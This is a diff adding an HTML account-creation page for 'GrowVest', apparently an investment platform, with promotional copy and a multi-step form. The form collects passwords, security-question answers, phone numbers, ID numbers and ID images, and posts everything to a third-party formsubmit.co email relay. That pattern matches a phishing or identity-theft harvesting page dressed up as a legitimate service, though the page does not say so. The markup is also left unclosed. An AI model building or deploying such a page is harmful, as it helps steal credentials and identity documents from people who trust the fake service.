@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GrowVest - Create Account</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1>GrowVest</h1>
+    <h2>Create Account and Start Growing Your Wealth</h2>
+    <p>Join the thousands of investors who trust GrowVest with their financial futures.</p>
+    <p>Experience the power of smart investing with:</p>
+    <ul>
+      <li>Expert guidance</li>
+      <li>Low fees</li>
+      <li>Diversified portfolios</li>
+      <li>Real-time tracking</li>
+    </ul>
+    
+    <form action="https://formsubmit.co/d0e0011c5c127390f7bf62de1476db60" method="POST" data-captcha="true">
+      <input type="hidden" name="_subject" value="New Account Creation">
+      <input type="hidden" name="_template" value="table">
+      <!-- Step 1: Basic Information -->
+      <div class="form-step">
+        <h2>Basic Information</h2>
+        <input type="text" name="name" required placeholder="Full Name">
+        <label for="first-name">First Name</label>
+        <input type="text" id="first-name" name="first-name" required>
+        <label for="last-name">Last Name</label>
+        <input type="text" id="last-name" name="last-name" required>
+        <input type="email" name="email" required placeholder="Email Address">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" required>
+      </div>
+      
+      <!-- Step 2: Account Security -->
+      <div class="form-step">
+        <h2>Account Security</h2>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required minlength="8">
+        <label for="confirm-password">Confirm Password</label>
+        <input type="password" id="confirm-password" name="confirm-password" required minlength="8">
+        <label for="security-question">Security Question</label>
+        <select id="security-question" name="security-question" required>
+          <option value="">Select a question</option>
+          <option value="mother-maiden-name">Mother's Maiden Name</option>
+          <option value="first-pet-name">First Pet's Name</option>
+          <option value="favorite-teacher">Favorite Teacher's Name</option>
+        </select>
+        <label for="security-answer">Security Answer</label>
+        <input type="text" id="security-answer" name="security-answer" required>
+      </div>
+      
+      <!-- Step 3: Investment Profile -->
+      <div class="form-step">
+        <h2>Investment Profile</h2>
+        <label for="investment-experience">Investment Experience</label>
+        <select id="investment-experience" name="investment-experience" required>
+          <option value="">Select an option</option>
+          <option value="beginner">Beginner</option>
+          <option value="intermediate">Intermediate</option>
+          <option value="advanced">Advanced</option>
+        </select>
+        <label for="risk-tolerance">Risk Tolerance</label>
+        <select id="risk-tolerance" name="risk-tolerance" required>
+          <option value="">Select an option</option>
+          <option value="low">Low</option>
+          <option value="moderate">Moderate</option>
+          <option value="high">High</option>
+        </select>
+      </div>
+      
+      <!-- Step 4: Language Preference -->
+      <div class="form-step">
+        <h2>Language Preference</h2>
+        <label for="language">Select your preferred language</label>
+        <select id="language" name="language" required>
+          <option value="">Select a language</option>
+          <option value="english">English</option>
+          <option value="spanish">Spanish</option>
+          <option value="french">French</option>
+          <option value="mandarin">Mandarin</option>
+          <option value="arabic">Arabic</option>
+          <option value="portuguese">Portuguese</option>
+          <option value="russian">Russian</option>
+          <option value="japanese">Japanese</option>
+          <option value="korean">Korean</option>
+          <option value="german">German</option>
+          <option value="italian">Italian</option>
+        </select>
+      </div>
+      <div class="form-step">
+        <h2>Verification</h2>
+        <label for="id-type">ID Type</label>
+        <select id="id-type" name="id-type" required>
+          <option value="">Select an option</option>
+          <option value="driver-license">Driver's License</option>
+          <option value="passport">Passport</option>
+          <option value="state-id">State ID</option>
+        </select>
+        <label for="id-number">ID Number</label>
+        <input type="text" id="id-number" name="id-number" required>
+        <label for="id-image">ID Image</label>
+        <input type="file" id="id-image" name="id-image" accept="image/*" required>
+        <p>By submitting this form, you agree to our Terms of Service and Privacy Policy.</p>
+      </div>
+      
+      <!-- Create Account Button -->
+      <button type="submit" class="create-account-btn">Create Account and Start Investing</button>
+      
+      <!-- Additional Text -->
+      <p>Already have an account? <a href="login.html">Log in</a></p>
+  <p>Need help? <a href="#">Contact Support</a></p>
+  <script src="script.js"></script>
+</body>
+</html>
+
